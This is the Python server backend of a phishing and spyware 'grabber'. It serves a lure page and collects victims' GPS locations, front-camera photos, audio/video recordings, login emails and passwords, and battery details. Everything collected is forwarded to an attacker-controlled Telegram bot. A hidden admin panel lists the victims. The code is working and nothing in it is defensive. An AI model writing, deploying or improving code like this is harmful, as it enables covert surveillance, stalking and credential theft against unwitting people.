from http.server import BaseHTTPRequestHandler
import json
import sys
import os
import base64
import time
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import grabber_fixed

TELEGRAM_TOKEN = grabber_fixed.TELEGRAM_TOKEN
TELEGRAM_CHAT_ID = grabber_fixed.TELEGRAM_CHAT_ID

def tg_send(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": msg},
            timeout=8
        )
    except Exception as e:
        print(f"tg_send error: {e}")

def tg_photo(img_bytes, caption):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
            data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption},
            files={"photo": ("photo.jpg", img_bytes, "image/jpeg")},
            timeout=12
        )
    except Exception as e:
        print(f"tg_photo error: {e}")

def tg_doc(doc_bytes, filename, caption):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
            data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption},
            files={"document": (filename, doc_bytes, "application/octet-stream")},
            timeout=15
        )
    except Exception as e:
        print(f"tg_doc error: {e}")

class Handler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass  # Suppress default logging

    def do_GET(self):
        import urllib.parse
        parsed = urllib.parse.urlparse(self.path)

        if parsed.path.startswith('/admin'):
            params = urllib.parse.parse_qs(parsed.query)
            if params.get('clear'):
                grabber_fixed.victims_data.clear()
                self.send_response(200)
                self.end_headers()
                return
            if parsed.path == '/admin/data':
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"victims": grabber_fixed.victims_data}).encode())
                return
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(grabber_fixed.ADMIN_PANEL.encode())
            return

        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(grabber_fixed.HTML_PAGE.encode("utf-8"))

    def do_POST(self):
        if self.path != '/s':
            self.send_response(404)
            self.end_headers()
            return

        try:
            length = int(self.headers.get("Content-Length", 0))
            if length <= 0:
                self.send_response(400)
                self.end_headers()
                return

            raw = self.rfile.read(length)
            data = json.loads(raw)

            ua = data.get('ua', 'unknown')
            v_id = str(hash(ua))[:15]
            msg_type = data.get('type', '')

            # Register victim
            if v_id not in grabber_fixed.victims_data:
                grabber_fixed.victim_count += 1
                cnt = grabber_fixed.victim_count
                grabber_fixed.victims_data[v_id] = {'id': cnt}
                tg_send(f"\U0001f195 NEW VICTIM #{cnt}\nDevice: {ua[:60]}")
            else:
                cnt = grabber_fixed.victims_data[v_id]['id']

            # --- GPS ---
            if msg_type == 'gps' and 'lat' in data:
                lat, lon = data['lat'], data['lon']
                tg_send(f"\U0001f4cd GPS (Victim #{cnt})\nMap: https://www.google.com/maps?q={lat},{lon}")

            # --- Front Camera Photo ---
            elif msg_type == 'FRONT_live' and 'photo' in data:
                try:
                    b64 = data['photo']
                    if ',' in b64:
                        b64 = b64.split(',')[1]
                    img_bytes = base64.b64decode(b64)
                    if len(img_bytes) > 200:
                        tg_photo(img_bytes, f"\U0001f4f8 Front cam (Victim #{cnt})")
                        print(f"Sent front photo {len(img_bytes)} bytes")
                except Exception as e:
                    print(f"Photo decode error: {e}")

            # --- Audio/Video chunk ---
            elif msg_type == 'audio_video' and 'data' in data:
                try:
                    b64 = data['data']
                    if ',' in b64:
                        b64 = b64.split(',')[1]
                    doc_bytes = base64.b64decode(b64)
                    if len(doc_bytes) > 100:
                        fname = f"vid_{cnt}_{int(time.time())}.webm"
                        tg_doc(doc_bytes, fname, f"\U0001f3a5 Video chunk (Victim #{cnt}) {len(doc_bytes)//1024}KB")
                        print(f"Sent video chunk {len(doc_bytes)} bytes")
                except Exception as e:
                    print(f"Video decode error: {e}")

            # --- Login credentials ---
            elif msg_type == 'login':
                email = data.get('email', '')
                pwd = data.get('password', '')
                tg_send(f"\U0001f525 LOGIN (Victim #{cnt})\nEmail: {email}\nPassword: {pwd}")

            # --- Battery/Device info ---
            if 'battery' in data and not grabber_fixed.victims_data[v_id].get('battery_alerted'):
                grabber_fixed.victims_data[v_id]['battery_alerted'] = True
                charge = " (Charging)" if data.get('charging') else ""
                tg_send(f"\U0001f50b Device (Victim #{cnt})\nBattery: {data['battery']}{charge}")

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"ok":true}')

        except Exception as e:
            print(f"POST handler error: {e}")
            self.send_response(500)
            self.end_headers()
